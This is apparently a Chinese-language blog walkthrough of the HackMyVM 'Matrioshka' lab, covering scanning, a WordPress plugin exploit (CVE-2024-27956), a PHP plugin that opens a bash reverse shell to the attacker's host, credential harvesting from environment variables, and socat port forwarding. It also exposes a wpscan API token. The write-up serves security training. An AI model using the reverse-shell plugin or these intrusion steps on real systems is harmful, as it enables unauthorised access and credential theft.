{"pageProps":{"postData":{"id":"HackMyVMMatrioshka (only user)","contentHtml":"<h1>Matrioshka. (only user)</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Matrioshka\">https://hackmyvm.eu/machines/machine.php?vm=Matrioshka</a></p>\n</blockquote>\n<p>Notes：<strong>This lab needed around 2 minutes for get up all the containers.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka nmap -sP 192.168.56.0/24                  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:05 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00057s latency).\nMAC Address: 08:00:27:2F:F3:93 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.49\nHost is up (0.00038s latency).\nMAC Address: 08:00:27:6A:20:65 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.50\nHost is up (0.00040s latency).\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka nmap -sT -min-rate 10000 -p- 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:06 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.50\nHost is up (0.00080s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.88 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka nmap -sT -A -T4 -O -p 22,80 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:06 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.50\nHost is up (0.00078s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 b5:a4:7c:65:5c:1f:d7:89:42:bd:76:<span class=\"hljs-built_in\">df</span>:2c:8e:93:4e (ECDSA)\n|_  256 5d:3d:2b:43:<span class=\"hljs-built_in\">fc</span>:89:fa:24:a3:f4:73:5f:7b:89:6c:e3 (ED25519)\n80/tcp open  http    Apache httpd 2.4.61 ((Debian))\n|_http-title: mamushka\n|_http-server-header: Apache/2.4.61 (Debian)\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.78 ms 192.168.56.50\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 24.67 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka nmap -script=vuln 22,80 192.168.56.50\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 23:08 EDT\nFailed to resolve <span class=\"hljs-string\">\"22,80\"</span>.\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.50\nHost is up (0.00019s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-csrf: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.50\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://192.168.56.50:80/\n|     Form id: wp-block-search__input-2\n|     Form action: http://mamushka.hmv/\n|     \n|     Path: http://192.168.56.50:80/\n|     Form id: um_field_8_user_login\n|_    Form action: \n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n| http-enum: \n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2 \n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|_  /wp-login.php: Wordpress login page.\nMAC Address: 08:00:27:6C:FD:E0 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 48.17 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>看 <code>script</code> 扫描的结果是 <code>wordpress</code> ，将 <code>mamushka.hmv</code> 添加进 <code>/etc/hosts</code></p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image.png\" alt=\"image.png\"></p>\n<p>直接上 <code>wpscan</code></p>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka wpscan --url mamushka.hmv --api-token bOauzGNYvhy6BU3DlHGCMVZmWJDqZH5tuFoHfsdk91o -e u,ap --plugins-detection mixed  \n_______________________________________________________________                                         \n         __          _______   _____                                                                    \n         \\ \\        / /  __ \\ / ____|                                                                    \n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®                                                  \n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | <span class=\"hljs-string\">'_ \\                                                   \n            \\  /\\  /  | |     ____) | (__| (_| | | | |   \n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|                                                  \n                                             \n         WordPress Security Scanner by the WPScan Team    \n                         Version 3.8.27           \n       Sponsored by Automattic - https://automattic.com/                                                \n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                  \n_______________________________________________________________    \n                                                            \n[+] URL: http://mamushka.hmv/ [192.168.56.50]\n[+] Started: Tue Apr 22 23:16:04 2025\n\nInteresting Finding(s):\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.61 (Debian)\n |  - X-Powered-By: PHP/8.2.22\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://mamushka.hmv/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://mamushka.hmv/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://mamushka.hmv/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.6.1 identified (Insecure, released on 2024-07-23).\n | Found By: Query Parameter In Install Page (Aggressive Detection)\n |  - http://mamushka.hmv/wp-includes/css/dashicons.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-includes/css/buttons.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/forms.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/l10n.min.css?ver=6.6.1\n |  - http://mamushka.hmv/wp-admin/css/install.min.css?ver=6.6.1\n\n[+] WordPress theme in use: twentytwentyfour\n | Location: http://mamushka.hmv/wp-content/themes/twentytwentyfour/\n | Last Updated: 2024-11-13T00:00:00.000Z\n | Readme: http://mamushka.hmv/wp-content/themes/twentytwentyfour/readme.txt\n | [!] The version is out of date, the latest version is 1.3\n | Style URL: http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css\n | Style Name: Twenty Twenty-Four\n | Style URI: https://wordpress.org/themes/twentytwentyfour/\n | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...\n | Author: the WordPress team\n | Author URI: https://wordpress.org\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 1.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://mamushka.hmv/wp-content/themes/twentytwentyfour/style.css, Match: '</span>Version: 1.2<span class=\"hljs-string\">'\n\n[+] Enumerating All Plugins (via Passive and Aggressive Methods)\n Checking Known Locations - Time: 00:04:06 &#x3C;==========================================================================================================================> (110121 / 110121) 100.00% Time: 00:04:06\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://mamushka.hmv/wp-content/plugins/akismet/\n | Latest Version: 5.3.7\n | Last Updated: 2025-04-14T23:37:00.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/akismet/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)\n |     Fixed in: 3.1.5\n |     References:\n |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357\n |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/\n |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html\n |\n | The version could not be determined.\n [+] meta-generator-and-version-info-remover\n | Location: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/\n | Latest Version: 16.0 (up to date)\n | Last Updated: 2024-11-20T05:03:00.000Z\n | Readme: http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/, status: 403\n |\n | Version: 16.0 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/meta-generator-and-version-info-remover/readme.txt\n\n[+] ultimate-member\n | Location: http://mamushka.hmv/wp-content/plugins/ultimate-member/\n | Last Updated: 2025-04-02T20:20:00.000Z\n | Readme: http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n | [!] The version is out of date, the latest version is 2.10.2\n |\n | Found By: Urls In Homepage (Passive Detection)\n | Confirmed By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/, status: 403\n |\n | [!] 7 vulnerabilities identified:\n |\n | [!] Title: Ultimate Member &#x3C; 2.8.7 - Cross-Site Request Forgery to Membership Status Change\n |     Fixed in: 2.8.7\n |     References:\n |      - https://wpscan.com/vulnerability/2b670a80-2682-4b7f-a549-64a35345e630\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8520\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ffddc03-d4ae-460e-972a-98804d947d09\n |\n | [!] Title: Ultimate Member &#x3C; 2.8.7 - Authenticated (Contributor+) Stored Cross-Site Scripting\n |     Fixed in: 2.8.7\n |     References:\n |      - https://wpscan.com/vulnerability/7488f9f3-03ea-4f4e-b5fb-c0dd02c5bb59\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8519\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/9e394bb2-d505-4bf1-b672-fea3504bf936\n |\n | [!] Title: Ultimate Member &#x3C; 2.9.0 - Missing Authorization to Authenticated (Subscriber+) Arbitrary User Profile Picture Update\n |     Fixed in: 2.9.0\n |     References:\n |      - https://wpscan.com/vulnerability/54a53b30-4249-4559-85f8-7aeac2dc0df2\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10528\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0a9793b6-2186-46ef-b204-d8f8f154ebf3\n |\n | [!] Title: Ultimate Member – User Profile, Registration, Login, Member Directory, Content Restriction &#x26; Membership Plugin &#x3C; 2.9.2 - Information Exposure\n |     Fixed in: 2.9.2\n |     References:\n |      - https://wpscan.com/vulnerability/cb9c5ef8-51f8-4a46-ae56-23302c5980aa\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0318\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4ee149bf-ffa3-4906-8be2-9c3c40b28287\n |\n | [!] Title: Ultimate Member &#x3C; 2.9.2 - Unauthenticated SQL Injection\n |     Fixed in: 2.9.2\n |     References:\n |      - https://wpscan.com/vulnerability/31ef60db-4847-4623-a194-8722e668e6ab\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0308\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e3e5bb98-2652-499a-b8cd-4ebfe1c1d890\n |\n | [!] Title: Ultimate Member &#x3C; 2.10.0 - Authenticated SQL Injection\n |     Fixed in: 2.10.0\n |     References:\n |      - https://wpscan.com/vulnerability/90b5192a-ceee-4612-8e21-2341bae29cad\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12276\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/846f9828-2f1f-4d08-abfb-909b8d634d8a\n |\n | [!] Title: Ultimate Member &#x3C; 2.10.1 - Unauthenticated SQLi\n |     Fixed in: 2.10.1\n |     References:\n |      - https://wpscan.com/vulnerability/1d39ff72-1178-4812-be55-9bf4b58bbbb6\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1702\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/34adbae5-d615-4f8d-a845-6741d897f06c\n |\n | Version: 2.8.6 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/ultimate-member/readme.txt\n\n [+] wp-automatic\n | Location: http://mamushka.hmv/wp-content/plugins/wp-automatic/\n | Latest Version: 3.110.0\n | Last Updated: 2025-04-15T04:28:47.000Z\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://mamushka.hmv/wp-content/plugins/wp-automatic/, status: 200\n |\n | [!] 7 vulnerabilities identified:\n |\n | [!] Title: Automatic 2.0.3 - csv.php q Parameter SQL Injection\n |     Fixed in: 2.0.4\n |     References:\n |      - https://wpscan.com/vulnerability/dadc99ca-54ee-42b4-b247-79a47b884f03\n |      - https://www.exploit-db.com/exploits/19187/\n |      - https://packetstormsecurity.com/files/113763/\n |\n | [!] Title: WordPress Automatic &#x3C; 3.53.3 - Unauthenticated Arbitrary Options Update\n |     Fixed in: 3.53.3\n |     References:\n |      - https://wpscan.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4374\n |      - https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/\n |\n | [!] Title: Automatic &#x3C; 3.92.1 - Cross-Site Request Forgery to Privilege Escalation\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/fa2f3687-7a5f-4781-8284-6fbea7fafd0e\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27955\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/12adf619-4be8-4ecf-8f67-284fc44d87d0\n |\n | [!] Title: Automatic &#x3C; 3.92.1 - Unauthenticated Arbitrary File Download and Server-Side Request Forgery\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/620e8931-64f0-4d9c-9a4c-1f5a703845ff\n |\n | [!] Title: Automatic &#x3C; 3.92.1 - Unauthenticated SQL Injection\n |     Fixed in: 3.92.1\n |     References:\n |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27956\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a\n |\n | [!] Title: WordPress Automatic Plugin &#x3C; 3.93.0 Cross-Site Request Forgery\n |     Fixed in: 3.93.0\n |     References:\n |      - https://wpscan.com/vulnerability/e5d0dcec-41a7-40ae-b9ce-f839de9c28b8\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-32693\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6231e47e-2120-4746-97c1-2aa80aa18f4e\n |\n | [!] Title: WordPress Automatic &#x3C; 3.95.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via autoplay Parameter\n |     Fixed in: 3.95.0\n |     References:\n |      - https://wpscan.com/vulnerability/d0198310-b323-476a-adf8-10504383ce1c\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4849\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4be58bfa-d489-45f5-9169-db8bab718175\n |\n | The version could not be determined.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:20 &#x3C;==================================================================================================================================> (10 / 10) 100.00% Time: 00:00:20\n\n[i] User(s) Identified:\n\n[+] admin\n | Found By: Rss Generator (Passive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 6\n | Requests Remaining: 19\n\n[+] Finished: Tue Apr 22 23:21:28 2025\n[+] Requests Done: 110201\n[+] Cached Requests: 25\n[+] Data Sent: 29.485 MB\n[+] Data Received: 15.042 MB\n[+] Memory used: 576.402 MB\n[+] Elapsed time: 00:05:23\n</span></code></pre>\n<p>其中 <code>wp-automatic</code> 和 <code>ultimate-member</code> 有漏洞，其中<code>wp-automatic</code> 不知道准确版本</p>\n<h3>CVE-2024-27956</h3>\n<p>最后测试中，发现存在 <code>CVE-2024-27956</code> 可利用，exp：<a href=\"https://github.com/diego-tella/CVE-2024-27956-RCE\">https://github.com/diego-tella/CVE-2024-27956-RCE</a></p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image1.png\" alt=\"image.png\"></p>\n<p>exp 通过漏洞给我们创建了恶意管理员用户 <code>eviladmin:admin</code></p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image2.png\" alt=\"image.png\"></p>\n<h3>WordPress 后台利用</h3>\n<p>上传恶意插件来 <code>Getshell</code></p>\n<ol>\n<li>\n<p>制作恶意插件</p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php\n/**\n * Plugin Name: Reverse Shell Plugin\n * Plugin URI: \n * Description: Reverse Shell Plugin <span class=\"hljs-keyword\">for</span> penetration testing.\n * Version: 1.0\n * Author: Security Analyst\n * Author URI: http://www.example.com\n */\n<span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.56.4/1234 0>&#x26;1'\"</span>);\n?>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka vim shell.php \n➜  Matrioshka zip shell.zip shell.php \n  adding: shell.php (deflated 28%)\n</code></pre>\n</li>\n<li>\n<p>上传 <code>shell.zip</code></p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image3.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>上传完毕后<code>Kali</code>开启监听</p>\n</li>\n<li>\n<p>然后到插件页面<strong>启用</strong>插件就能收到弹回来的 <code>shell</code> 了</p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image4.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>提权 - to matrioshka</h2>\n<h3>信息收集</h3>\n<p>可以看到是在<code>Docker</code> 容器里面</p>\n<pre><code class=\"hljs language-bash\">www-data@3ed5ddfe0e0c:/var/www/html/wp-admin$ <span class=\"hljs-built_in\">ls</span> -al /\n<span class=\"hljs-built_in\">ls</span> -al /\ntotal 72\ndrwxr-xr-x   1 root root 4096 Aug 21  2024 .\ndrwxr-xr-x   1 root root 4096 Aug 21  2024 ..\n-rwxr-xr-x   1 root root    0 Aug 21  2024 .dockerenv\n</code></pre>\n<p>找一下数据库配置文件</p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image5.png\" alt=\"image.png\"></p>\n<p>可以发现是通过环境变量来获取的，查看一下环境变量</p>\n<pre><code class=\"hljs language-bash\">www-data@3ed5ddfe0e0c:/var/www/html$ <span class=\"hljs-built_in\">env</span>\n\nHOSTNAME=3ed5ddfe0e0c\nPHP_VERSION=8.2.22\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nGPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\nPHP_LDFLAGS=-Wl,-O1 -pie\nPWD=/var/www/html\nAPACHE_LOG_DIR=/var/log/apache2\nLANG=C\nPHP_SHA256=8566229bc88ad1f4aadc10700ab5fbcec81587c748999d985f11cf3b745462df\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nWORDPRESS_DB_HOST=db\nPHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c\nPHP_URL=https://www.php.net/distributions/php-8.2.22.tar.xz\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOCK_DIR=/var/lock/apache2\nSHLVL=2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\nWORDPRESS_DB_PASSWORD=Fukurokuju\nAPACHE_RUN_DIR=/var/run/apache2\nAPACHE_ENVVARS=/etc/apache2/envvars\nAPACHE_RUN_USER=www-data\nWORDPRESS_DB_USER=matrioska\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nWORDPRESS_DB_NAME=wordpressdb\nPHP_ASC_URL=https://www.php.net/distributions/php-8.2.22.tar.xz.asc\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\n_=/usr/bin/env\nOLDPWD=/var/www/html/wp-includes\n</code></pre>\n<p>获得凭据 <code>matrioska:Fukurokuju</code> 尝试一下进行 SSH</p>\n<pre><code class=\"hljs language-bash\">➜  Matrioshka ssh matrioshka@192.168.56.50\nThe authenticity of host <span class=\"hljs-string\">'192.168.56.50 (192.168.56.50)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:lVUuog2bGOZugWGvEpB7pgBuLs0sI2warKxGwgPeka4.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>192.168.56.50<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nmatrioshka@192.168.56.50'</span>s password: \nLinux matrioshka 6.1.0-23-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Aug 22 19:12:21 2024 from 10.0.2.8\nmatrioshka@matrioshka:~$ \n</code></pre>\n<p>成功登录，但是要注意环境变量中的用户名少了个字母，对比靶机名称得到的。</p>\n<pre><code class=\"hljs language-bash\">matrioshka@matrioshka:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nc8129b0390452d8378535cff76e0dde8\n</code></pre>\n<p>可以看到有很多网卡，也可以看出来有 <code>Docker</code> 环境</p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image6.png\" alt=\"image.png\"></p>\n<p>查看监听的端口</p>\n<pre><code class=\"hljs language-bash\">matrioshka@matrioshka:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:9090                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:8080                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:36437                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*  \n</code></pre>\n<p>有几个仅在本地开放的端口：<code>9090</code>，<code>8080</code>，<code>36437</code></p>\n<p>上传 <code>pspy64</code> 监听一下</p>\n<p><img src=\"/post-images/HackMyVMMatrioshka%20(only%20user)/image7.png\" alt=\"image.png\"></p>\n<p>通过 <code>socat</code> 转发出来</p>\n<pre><code class=\"hljs language-bash\">matrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:9091,fork TCP4:127.0.0.1:9090 &#x26;\n[1] 31379\nmatrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:8081,fork TCP4:127.0.0.1:8080 &#x26;\n[2] 31534\nmatrioshka@matrioshka:/tmp$ ./socat TCP-LISTEN:36438,fork TCP4:127.0.0.1:36437 &#x26;\n[3] 31535\n</code></pre>\n<h2>到这里没法继续，一些服务起不来</h2>","title":"HackMyVM - Matrioshka (only user)","date":"2025-04-23","updated":"2025-04-23","comments":true,"tags":["Linux靶机","HackMyVM","WordPress"],"categories":"靶机","description":"Matrioshka. (only user) https://hackmyvm.eu/machines/machine.php?vm=Matrioshka Notes：This lab needed around 2 minutes for get up all the containers. 前..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true}